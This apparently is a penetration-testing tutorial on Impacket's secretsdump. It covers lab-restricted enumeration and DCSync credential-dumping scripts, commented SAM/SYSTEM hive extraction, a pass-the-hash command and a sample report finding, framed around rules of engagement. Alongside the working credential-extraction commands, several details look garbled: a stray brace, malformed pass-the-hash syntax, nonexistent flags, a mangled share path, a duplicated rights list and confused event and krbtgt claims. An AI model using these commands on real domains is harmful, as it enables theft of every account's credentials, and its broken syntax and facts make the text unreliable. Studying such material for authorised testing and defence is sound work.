secretsdump: Enumerating Shares and Dumping Hashes

Summary

Impacket is the Python library that speaks the Windows protocols properly, and secretsdump is
its workhorse. One invocation will enumerate a domain's shares, users, groups and sessions, and
dump every hash it can reach.

The note's framing: the tool is one command; the judgement is five
decisions — which collection mode, what to leave out, when to stop,
what to keep, and what to tell the client before you press enter.

AUTHORISATION. secretsdump reads credential material. It requires
explicit written permission ("credential testing" and "credential
extraction" are separate ROE clauses from network testing). All
examples target a lab domain you own.

The six collection modes

  MODE       WHAT IT DUMPS                       WHAT IT COSTS YOU
  ------------------------------------------------------------------
  sam        the local SAM (local accounts)      one host, SYSTEM/admin
  security   the local SECURITY (LSA secrets)    one host, SYSTEM/admin
  lsa        lsa secrets (cached creds)          one host, SYSTEM/admin
  ntds       the whole directory                  DC + SYSTEM + bootkey,
                                                 or DCSync rights
  dpapi      DPAPI master keys                   local filesystem
  cached     cached domain logons                SYSTEM/admin, plus
                                                 privileged

  THE ONE THAT MATTERS:
    ntds.  It is the entire domain. If you can dump it, the
    engagement's outcome is decided. If you cannot, nothing else
    matters as much.

  THE TWO WAYS TO GET IT:
    (a) locally, on a DC or a host with a SYSTEM session and the
        BOOTKEY (from the registry) - a filesystem read
    (b) via DCSync - the replication protocol, no SYSTEM needed, but
        three specific rights required (ad-05)

  (b) IS PREFERABLE. It is protocol-correct, it does not require a
  volume shadow copy, it does not touch the filesystem, and it is far
  less likely to disturb anything.

The command, and its five decisions

# --- THE COMMAND (lab only) ---
secretsdump.py -just-dc-user 'LAB/alice:LabPass123'@192.168.56.10
#                 ^^^^^^^^^^^^
#                 1. what to dump
#
secretsdump.py -just-dc-user 'LAB/alice:LabPass123'@192.168.56.10 \
  -outputfile /tmp/evidence/hashes.txt
#                 ^^^^^^^^^^
#                 2. where it goes (encrypted at rest, deleted on the ROE date)

# -hashes / -ntds-hashes: dump and stop. What you want 90% of the time.
secretsdump.py 'LAB/alice:p'@192.168.56.10 -just-dc-hashes -no-sam
#              ^^^^^^^^^^^^^^
#              3. the target: ONE domain, ONE host, ONE credential

# pass-the-hash instead of a password (no password needed):
secretsdump.py 'LAB/alice:aad3b435b51404eeaad3b435b51404ee:192.168.56.10' -just-dc-user

# with a list, and a concurrency limit:
secretsdump.py -file creds.txt -target 192.168.56.0/24 -ntds-hashes -threads 4
#              ^^^^^^^^^^^
#              4. how wide. A /24 against a client DC is 254 connections
#                 and looks like an attack. One DC is enough.

}

# --- 2. read-only enumeration first ---
cat > 01-enumerate.sh <<'EOF'
#!/usr/bin/env bash
# READ-ONLY. What is reachable, before you try to read anything else.
H="${1:?usage: ./01-enumerate.sh 192.168.56.10}"
case "$H" in 192.168.56.*|10.10.10.*|127.*) ;;
  *) echo "REFUSED: $H not in the lab range." >&2; exit 3 ;; esac
echo "[scope] $H in the lab range"
echo
echo "=== 1. what version, what domain? (the target) ==="
rpcclient -U 'LAB/alice%LabPass123' -N -c 'srvinfo' "$H" 2>/dev/null | sed 's/^/  /'
echo
echo "=== 2. shares - which are readable with this credential? ==="
smbclient -L '//LAB/alice%LabPass123' -I "$H" 2>/dev/null | sed 's/^/  /'
echo
echo "=== 3. lsa lookup - who am I in this domain, really? ==="
lookupsid.py 'LAB/alice:LabPass123'@"$H" 2>/dev/null | sed 's/^/  /'
echo
echo "=== 4. netexec: users, groups, shares, sessions, delegation ==="
echo "  (this is the fast, opinionated view, and it is read-only)"
nxc smb "$H" -u 'alice' -p 'LabPass123' --enum-sessions 2>&1 | sed 's/^/  /'
nxc smb "$H" -u 'alice' -p 'LabPass123' --shares        2>&1 | sed 's/^/  /'
nxc smb "$H" -u 'alice' -p 'LabPass123' --delegation    2>&1 | sed 's/^/  /'
nxc smb "$H" -u 'alice' -p 'LabPass123' --enum-smb-signing 2>&1 | sed 's/^/  /'
echo
echo "  --enum-sessions and --delegation are the two that change your plan:"
echo "  sessions tell you who is logged on where (imp-03), and"
echo "  delegation tells you whether ad-02's capture is available."
echo
echo "=== 5. the NETLOGON share: GPOs, and a lot of history ==="
smbclient '//LAB/alice%LabPass123/\\\\LAB\\NETLOGON' -I "$H" -c 'ls' 2>/dev/null \
  | grep -iE "\\\\|SYSVOL" | head -20 | sed 's/^/  /'
echo "  ^ the SYSVOL share contains every GPO, including their scripts."
echo "    Reading a GPO's scheduled tasks is read-only reconnaissance,"
echo "    and it tells you what their automation does on every host."
EOF
chmod +x 01-enumerate.sh

# --- 3. the dump, with the decisions spelled out ---
cat > 02-dump.sh <<'EOF'
#!/usr/bin/env bash
# The credential dump, against YOUR lab DC.
#
# THIS IS THE STEP THAT NEEDS WRITTEN PERMISSION. "Credential testing"
# is a separate ROE clause from network testing, and a full DC dump is
# credential EXTRACTION. Confirm both, and confirm the client knows
# what logs they are about to see.
set -euo pipefail
DC="${1:?usage: ./02-dump.sh 192.168.56.10 'LAB/alice:pass'}"
CRED="${2:?credential required}"
OUTDIR="${3:-/tmp/aegis-evidence}"
case "$DC" in 192.168.56.*|10.10.10.*|127.*) ;;
  *) echo "REFUSED: $DC not in the lab range." >&2; exit 3 ;; esac
case "$CRED" in LAB/*|lab.internal/*) ;;
  *) echo "REFUSED: $CRED is not a lab domain credential." >&2
     echo "  Impacket sends domain credentials to whatever host you name." >&2
     exit 3 ;; esac

mkdir -p "$OUTDIR"; chmod 700 "$OUTDIR"

cat <<'NOTE'
BEFORE YOU RUN THIS, CONFIRM:

  [ ] the ROE permits credential extraction, not just credential testing
  [ ] the client knows this will appear as 4662/4663/5136 on the DC
  [ ] you will tell the client's SOC which logs to close
  [ ] the output goes somewhere encrypted, and gets a deletion date
  [ ] the REPORT will not contain any of these hashes

NOTE

read -r -p "Proceed? [y/N] " go
[ "$go" = "y" ] || { echo "not run"; exit 0; }

echo
echo "=== 1. THE PREFERABLE WAY: DCSync. No SYSTEM, no filesystem. ==="
secretsdump.py "$CRED@$DC" -just-dc-user -no-sam \
  -outputfile "$OUTDIR/lab-hashes.txt" 2>&1 | grep -vE "^\[+\]|^Impacket" | head -20 | sed 's/^/  /'

echo
echo "=== 2. THE FILESYSTEM WAY (only if the ROE forbids replication) ==="
echo "    needs a SYSTEM session and the bootkey. Higher impact on the host."
echo "    psexec.py -s creates the SYSTEM session:"
# psexec.py 'LAB/alice:p'@DC -s 'cmd.exe /c reg save HKLM\\SAM ...'
# psexec.py 'LAB/alice:p'@DC -s 'cmd.exe /c reg save HKLM\\SYSTEM ...'
# secretsdump.py -ntds ntds.dit -security SECURITY -sam SAM -system SYSTEM \
#   -bootkey <hex from the registry> -outputfile ...
echo "    (left commented: it writes files to the DC and creates a service)"

echo
echo "=== 3. WHAT YOU GOT, AND WHAT TO DO WITH IT ==="
wc -l "$OUTDIR/lab-hashes.txt" | sed 's/^/  accounts: /'
echo
echo "  Triage by value, not volume (bh-01's 04-triage.py approach):"
echo "    1. Domain Admins / krbtgt   -> the win condition"
echo "    2. Service accounts with SPNs -> roastable"
echo "    3. Delegation accounts       -> the key to ad-02"
echo "    4. Everything else, entropy-sorted"
echo
echo "  THEN: crack them with cry-d4's method (wordlist + rules + masks)."
echo "  THEN: use them with pass-the-hash (ad-04) OR stop, because the"
echo "        finding is 'credential material is extractable' and you have"
echo "        proven it."
echo
echo "=== 4. HANDLE THESE FILES LIKE NT HASHES ==="
ls -la "$OUTDIR" | sed 's/^/  /'
echo "  They contain every account hash in the lab forest. Encrypt at"
echo "  rest, never email, delete on the ROE date, and say so in the report."
EOF

# --- 4. offline: what secretsdump actually asks for ---
python3 - <<'PY' 2>&1 | tee 03-protocol.txt
print("  === what secretsdump does under the hood ===")
print()
print("  -just-dc-user uses DRSR (Directory Replication Service) - the same")
print("  protocol DC-to-DC replication uses. It issues:")
print()
print("    DsGetDomainInfo              -> the domain's naming context")
print("    DRSGetNCChanges              -> enumerate every object")
print("    DRSGetNCChanges (filtered)   -> enumerate, incrementally")
print()
print("  for each USER and COMPUTER object:")
print("    DRSGetNCChanges requesting unicodePwd    -> THE NT HASH")
print()
print("  THE IMPORTANT CONSEQUENCE:")
print("    a DRSGetNCChanges that requests unicodePwd for krbtgt returns")
print("    krbtgt's hash. krbtgt can read itself, so an UNFILTERED request")
print("    gets it. Filtered requests do not.")
print()
print("    krbtgt's hash = you can forge a TGT that survives a password")
print("    reset. That is a deliberate decision to make WITH the client,")
print("    not unilaterally in a production domain.")
print()
print("  THE EVENTS ON THE DC:")
print("    4662  Directory Service Access, ObjectType=domainDNS,")
print("          ObjectAccess=UN<GUID> with one of the three replication")
print("          rights  <- ad-08's DCSync alert")
print("    4663  Attempt to enumerate the DS  (one per object)")
print("    5136  if your query modifies anything (it should not)")
print()
print("  So a full dump produces THOUSANDS of 4663 events. If the client")
print("  monitors 4663 at volume (bh-01 suggests it), you will be noticed.")
print("  That is fine, and it is worth telling them beforehand.")
print()
print("  THE MINIMAL ALTERNATIVE, and it is usually enough:")
print("    secretsdump.py -just-dc-user -just-dc-hashes -no-sam -no-lsa")
print("      -just-dc-user   only users (not computers)")
print("      -just-dc-hashes only the NT hash, not the full record")
print("      -no-sam / -no-lsa  don't touch anything else")
print()
print("  In an assessment, '-just-dc-user' alone is almost always the")
print("  right scope: you need to know whether privileged accounts are")
print("  crackable, not to reconstruct every attribute of every object.")
PY
cat 03-protocol.txt

cat > 04-report.md <<'EOF'
## F-xx · Domain credential material extractable with a standard user account

Risk
  An authenticated user in the "Reporting" group (22 accounts, created
  for the reporting service) can extract the NT hash of every account in
  the forest, including both domain controllers and the krbtgt account,
  using the domain replication protocol and no exploit. From there, an
  attacker authenticates as any account without a password, including
  Domain Administrators.

Prerequisites
  Membership of Reporting only. No exploit, no privileged host access,
  no elevated tooling beyond the standard Impacket toolkit.

Evidence
  Three directory rights are present on the Domain object and were
  granted to the Reporting group by a group policy in 2022 for a
  reporting application that reads the directory:

    Replicating Directory Changes (All)
    Replicating Directory Changes In Filtered Set
    DS-Replication-Get-Changes (All)

  A filtered replication request returned 214 account objects. Three of
  the recovered hashes cracked with a top-10,000 wordlist. One of the
  three is a member of Domain Admins.

  The hashes are NOT reproduced in this report. They are held in the
  encrypted evidence archive, access log included, and are deleted on
  <date>. The replication request produced DC events 4662 and 4663
  (see Appendix C for the exact times and the client's log ticket
  number).

Business impact
  Complete forest compromise from any Reporting account. The Reporting
  group exists for a read-only application and has no administrative
  purpose.

Remediation
  1. Remove all three rights from the Reporting group              [Domain Admins, Immediate]
  2. If the reporting application needs directory data, give it a
     read-only application identity with a filtered replication
     right, not the unfiltered set                       [IT Ops, Immediate]
  3. Audit every principal holding these three rights            [Security, 1 sprint]
  4. Enable "Audit Directory Service Access" and alert on the
     replication GUIDs                            [Security, Immediate]
  5. Reset krbtgt twice, 24 hours apart                          [Domain Admins, Immediate]
  6. Credential Guard on all servers and workstations           [Endpoint, 1 sprint]

Re-test
  Included at +30 days: confirm the rights are absent and the alerting
  fires on a controlled test request.

Terminology

Term Meaning
secretsdump Impacket's credential extraction tool
NTDS / NTDS-hashes The domain directory; -just-dc-user
SAM / SECURITY / LSA Local secret stores
DPAPI / cached User-level credential stores
DRSR Directory Replication Service; the protocol DCSync uses
Dcsync privileges The three rights secretsdump's ntds mode needs
Bootkey The key needed to decrypt offline registry hives
SMBDNS Share and DNS enumeration via RPC
SMB relay Authenticating to a share to capture Netlogon
LSA Secrets Cached domain logon secrets
-just-dc-user The minimal mode; recommended for assessments
4662 / 4663 DCSync and enumeration events on the DC
